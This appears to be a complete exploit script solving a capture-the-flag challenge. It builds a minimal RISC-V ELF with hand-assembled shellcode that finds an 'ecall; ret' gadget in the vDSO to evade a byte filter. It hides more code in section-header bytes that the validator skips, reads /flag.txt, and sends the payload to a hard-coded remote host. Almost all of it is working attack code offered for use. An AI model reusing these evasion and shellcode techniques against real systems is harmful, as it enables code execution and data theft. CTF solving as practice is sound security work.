#!/usr/bin/env python3
# Linux kernel RISC-V Image / initramfs pwn solve
# One-file exploit, no external deps.
#
# Usage:
#   python3 solve.py HOST=15.235.202.47 PORT=9002
#   python3 solve.py PROBE HOST=15.235.202.47 PORT=9002
#   python3 solve.py FLAG  HOST=15.235.202.47 PORT=9002 EFLAGS=0
#   python3 solve.py DUMP
#
# Idea:
#   1) Build a tiny valid RISC-V64 ET_EXEC ELF accepted by chall.
#   2) The file cannot contain raw ecall bytes: 73 00 00 00.
#   3) Bootstrap by parsing auxv to find AT_SYSINFO_EHDR.
#   4) Scan vDSO for an existing gadget: ecall; ret == 73 00 00 00 82 80.
#   5) Reuse that gadget for write/openat/read/write/exit.

import base64
import hashlib
import socket
import struct
import sys

DEFAULT_HOST = "15.235.202.47"
DEFAULT_PORT = 9002

ET_EXEC = 2
EM_RISCV = 0xF3
PT_LOAD = 1

# ----------------------------------------------------------------------
# RISC-V shellcodes.
# These are intentionally raw bytes because the remote only accepts a
# strict hand-made ELF layout.
# ----------------------------------------------------------------------

# Parse stack -> auxv -> AT_SYSINFO_EHDR -> scan vDSO for ecall;ret -> write(1,"OK\n",3)
PROBE_TEXT = bytes.fromhex(
    "8a82"              # mv    t0, sp
    "03b30200"          # ld    t1, 0(t0)       ; argc
    "a102"              # addi  t0, t0, 8
    "0e03"              # slli  t1, t1, 3
    "9a92"              # add   t0, t0, t1      ; skip argv pointers
    "a102"              # addi  t0, t0, 8       ; skip argv NULL
    "03b30200"          # env_loop: ld t1, 0(t0)
    "a102"              # addi  t0, t0, 8
    "e31d03fe"          # bnez  t1, env_loop
    "03b30200"          # aux_loop: ld t1, 0(t0)
    "83b38200"          # ld    t2, 8(t0)
    "c102"              # addi  t0, t0, 16
    "130e1002"          # li    t3, 33          ; AT_SYSINFO_EHDR
    "e319c3ff"          # bne   t1, t3, aux_loop

    "9e82"              # mv    t0, t2          ; t0 = vDSO base
    "0d63"              # lui   t1, 0x3         ; scan 0x3000 bytes
    "83c30200"          # scan: lbu t2, 0(t0)
    "130e3007"          # li    t3, 0x73
    "6391c303"          # bne   t2, t3, next
    "83d31200"          # lhu   t2, 1(t0)
    "639d0300"          # bnez  t2, next
    "83c33200"          # lbu   t2, 3(t0)
    "63990300"          # bnez  t2, next
    "83d34200"          # lhu   t2, 4(t0)
    "216e"              # lui   t3, 0x8
    "1b0e2e08"          # addiw t3, t3, 0x82    ; 0x8082 == c.ret
    "6386c301"          # beq   t2, t3, found
    "8502"              # next: addi t0, t0, 1
    "7d13"              # addi  t1, t1, -1
    "e31903fc"          # bnez  t1, scan

    # found:
    "0545"              # li    a0, 1
    "c165"              # lui   a1, 0x10
    "9b858512"          # addiw a1, a1, 0x128   ; shdr+8 => "OK\n"
    "0d46"              # li    a2, 3
    "93080004"          # li    a7, 64          ; write
    "8292"              # jalr  t0              ; call ecall;ret
)

# Same vDSO scan, then jump into continuation code hidden in section-header bytes.
FLAG_TEXT = bytes.fromhex(
    "8a8203b30200a1020e039a92a10203b30200a102e31d03fe"
    "03b3020083b38200c102130e1002e319c3ff9e820d6383c30200"
    "130e30076391c30383d31200639d030083c332006399030083d34200"
    "216e1b0e2e086386c30185027d13e31903fc"
    "29a0"              # found: j 0x1011a (shdr+8 when text_size == 0x62)
)

# Continuation at VA 0x1011a:
#   openat(AT_FDCWD, "/flag.txt", O_RDONLY)
#   read(fd, 0x210000, 0x7f)
#   save n to a2, set stdout, jump to continuation 2
FLAG_CONT1 = bytes.fromhex(
    "1305c0f9"          # li    a0, -100        ; AT_FDCWD
    "c165"              # lui   a1, 0x10
    "9b85a51b"          # addiw a1, a1, 0x1ba   ; "/flag.txt"
    "0146"              # li    a2, 0
    "93088003"          # li    a7, 56          ; openat
    "8292"              # jalr  t0

    "b7052100"          # lui   a1, 0x210       ; RW PT_LOAD buffer
    "1306f007"          # li    a2, 0x7f
    "9308f003"          # li    a7, 63          ; read
    "8292"              # jalr  t0

    "2a86"              # mv    a2, a0          ; n
    "0545"              # li    a0, 1           ; stdout
    "35a8"              # j     0x1017a
)

# Continuation at VA 0x1017a:
#   write(1, 0x210000, n)
#   exit(0)
FLAG_CONT2 = bytes.fromhex(
    "b7052100"          # lui   a1, 0x210       ; buffer
    "93080004"          # li    a7, 64          ; write
    "8292"              # jalr  t0

    "0145"              # li    a0, 0
    "9308d005"          # li    a7, 93          ; exit
    "8292"              # jalr  t0
)

def opt(name, default=None):
    prefix = name + "="
    for arg in sys.argv[1:]:
        if arg.startswith(prefix):
            return arg[len(prefix):]
    return default

def has(name):
    return name in sys.argv[1:]

def pack_ehdr(e_flags, shoff):
    ident = b"\x7fELF" + bytes([2, 1, 1, 0, 0]) + b"\x00" * 7
    return struct.pack(
        "<16sHHIQQQIHHHHHH",
        ident,
        ET_EXEC,
        EM_RISCV,
        1,
        0x100B0,    # e_entry
        0x40,       # e_phoff
        shoff,      # e_shoff
        e_flags,
        0x40,       # e_ehsize
        0x38,       # e_phentsize
        2,          # e_phnum
        0x40,       # e_shentsize
        3,          # e_shnum
        2,          # e_shstrndx
    )

def build_elf(text, patches=(), e_flags=0):
    text_size = len(text)
    shoff = 0xB0 + text_size
    total = text_size + 0x170

    # chall constraints from reverse engineering
    assert 0xB1 <= total <= 0x1E1
    assert text_size <= 0x71

    ehdr = pack_ehdr(e_flags, shoff)

    # First segment maps the whole file at 0x10000 as R-X.
    # p_filesz must equal decoded ELF length.
    ph0 = struct.pack(
        "<IIQQQQQQ",
        PT_LOAD,
        5,          # PF_R | PF_X
        0,
        0x10000,
        0x10000,
        total,
        0x1000,
        0x1000,
    )

    # Second segment is the RW scratch page at 0x210000.
    # Important: remote validator requires this to be PT_LOAD too.
    ph1 = struct.pack(
        "<IIQQQQQQ",
        PT_LOAD,
        6,          # PF_R | PF_W
        0,
        0x210000,
        0x210000,
        0,
        0x1000,
        0x1000,
    )

    shdrs = bytearray(0xC0)

    # The checker expects a real-looking .text and .shstrtab.
    shdrs[0x2F:0x40] = b"\x00.text\x00.shstrtab\x00"

    # Section 1: .text
    shdrs[0x40:0x80] = struct.pack(
        "<IIQQQQIIQQ",
        1,          # sh_name
        1,          # SHT_PROGBITS
        6,          # SHF_ALLOC | SHF_EXECINSTR
        0x100B0,    # sh_addr
        0xB0,       # sh_offset
        text_size,  # sh_size
        0,
        0,
        0x10,
        0,
    )

    # Section 2: .shstrtab
    shdrs[0x80:0xC0] = struct.pack(
        "<IIQQQQIIQQ",
        7,          # sh_name
        3,          # SHT_STRTAB
        0,
        0,
        text_size + 0xDF,
        0x11,
        0,
        0,
        1,
        0,
    )

    # Hide extra code/data in section-header bytes that are mapped R-X but not
    # counted as .text by the validator.
    for off, data in patches:
        shdrs[off:off + len(data)] = data

    # Restore checked string table after patches.
    shdrs[0x2F:0x40] = b"\x00.text\x00.shstrtab\x00"

    blob = ehdr + ph0 + ph1 + text + bytes(shdrs)
    assert len(blob) == total
    sanity(blob)
    return blob

def sanity(blob):
    # Global forbidden byte sequences.
    bad = [
        b"\x73\x00\x00\x00",  # ecall
        b"\x73\x00\x10\x00",  # ebreak
        b"\x02\x90",          # c.ebreak
    ]
    for pat in bad:
        assert pat not in blob, f"forbidden bytes present: {pat.hex()}"

    shoff = struct.unpack_from("<Q", blob, 0x28)[0]
    text_size = struct.unpack_from("<Q", blob, shoff + 0x40 + 0x20)[0]
    text = blob[0xB0:0xB0 + text_size]

    # .text cannot contain four identical consecutive bytes.
    run = 1
    for i in range(1, len(text)):
        if text[i] == text[i - 1]:
            run += 1
            assert run < 4, f"4-byte run at text+{i:#x}"
        else:
            run = 1

def make_payload(mode, e_flags=0):
    mode = mode.upper()

    if mode == "PROBE":
        # PROBE_TEXT size 0x70 => shdr VA 0x10120, shdr+8 == 0x10128.
        return build_elf(PROBE_TEXT, [(0x08, b"OK\n")], e_flags=e_flags)

    if mode == "FLAG":
        # FLAG_TEXT size 0x62:
        #   shdr start == 0x10112
        #   shdr+0x08 == 0x1011a -> FLAG_CONT1
        #   shdr+0x68 == 0x1017a -> FLAG_CONT2
        #   shdr+0xa8 == 0x101ba -> "/flag.txt"
        return build_elf(
            FLAG_TEXT,
            [
                (0x08, FLAG_CONT1),
                (0x68, FLAG_CONT2),
                (0xA8, b"/flag.txt\x00"),
            ],
            e_flags=e_flags,
        )

    raise ValueError("mode must be PROBE or FLAG")

def connect_send(blob, timeout):
    host = opt("HOST", DEFAULT_HOST)
    port = int(opt("PORT", str(DEFAULT_PORT)))
    b64 = base64.b64encode(blob) + b"\n"

    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)

    out = b""
    try:
        out += s.recv(4096)
    except socket.timeout:
        pass

    s.sendall(b64)

    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        out += chunk

    s.close()
    return out

def send_mode(mode, e_flags, timeout, quiet=False):
    blob = make_payload(mode, e_flags=e_flags)
    if not quiet:
        print(f"[*] target {opt('HOST', DEFAULT_HOST)}:{opt('PORT', str(DEFAULT_PORT))}")
        print(
            f"[*] mode={mode} e_flags={e_flags} len={len(blob)} "
            f"text={len(blob) - 0x170} b64len={len(base64.b64encode(blob))} "
            f"sha256={hashlib.sha256(blob).hexdigest()}"
        )

    out = connect_send(blob, timeout)
    if not quiet and out:
        sys.stdout.buffer.write(out)
        sys.stdout.buffer.flush()
        if not out.endswith(b"\n"):
            print()
    return out

def auto(timeout):
    print(f"[*] target {opt('HOST', DEFAULT_HOST)}:{opt('PORT', str(DEFAULT_PORT))}")

    winner = None
    for e_flags in (0, 1):
        blob = make_payload("PROBE", e_flags=e_flags)
        print(
            f"[*] probing e_flags={e_flags} "
            f"len={len(blob)} sha256={hashlib.sha256(blob).hexdigest()[:12]}"
        )
        out = connect_send(blob, timeout)
        print(f"    recv: {out!r}")

        if b"OK" in out:
            winner = e_flags
            print(f"[+] PROBE OK, using e_flags={winner}")
            break

        if b"invalid" in out:
            print(f"[-] validator rejected e_flags={e_flags}")
        else:
            print(f"[-] no OK for e_flags={e_flags}")

    if winner is None:
        print("[-] no working e_flags found")
        return 1

    print("[*] sending flag payload")
    out = send_mode("FLAG", winner, timeout, quiet=True)
    if out:
        sys.stdout.buffer.write(out)
        sys.stdout.buffer.flush()
        if not out.endswith(b"\n"):
            print()
    return 0

def dump():
    for e_flags in (0, 1):
        tag = f"e{e_flags}"
        for mode in ("PROBE", "FLAG"):
            blob = make_payload(mode, e_flags=e_flags)
            base = f"payload_{mode.lower()}_{tag}"
            Path = __import__("pathlib").Path
            Path(base + ".elf").write_bytes(blob)
            Path(base + ".b64").write_bytes(base64.b64encode(blob) + b"\n")
            print(
                f"[+] wrote {base}.elf / {base}.b64 "
                f"len={len(blob)} text={len(blob)-0x170} "
                f"sha256={hashlib.sha256(blob).hexdigest()}"
            )

def usage():
    print(f"""Usage:
  python3 {sys.argv[0]} HOST=15.235.202.47 PORT=9002
  python3 {sys.argv[0]} AUTO  HOST=15.235.202.47 PORT=9002
  python3 {sys.argv[0]} PROBE HOST=15.235.202.47 PORT=9002
  python3 {sys.argv[0]} FLAG  HOST=15.235.202.47 PORT=9002 EFLAGS=0
  python3 {sys.argv[0]} DUMP

Defaults:
  HOST={DEFAULT_HOST}
  PORT={DEFAULT_PORT}
  TIMEOUT=5
""")

def main():
    if has("HELP") or has("-h") or has("--help"):
        usage()
        return 0

    if has("DUMP"):
        dump()
        return 0

    timeout = float(opt("TIMEOUT", "5"))

    # Default is AUTO because the challenge may accept e_flags=0 or e_flags=1.
    if has("PROBE"):
        e_flags = int(opt("EFLAGS", "0"), 0)
        send_mode("PROBE", e_flags, timeout)
        return 0

    if has("FLAG"):
        e_flags = int(opt("EFLAGS", "0"), 0)
        send_mode("FLAG", e_flags, timeout)
        return 0

    return auto(timeout)

if __name__ == "__main__":
    raise SystemExit(main())
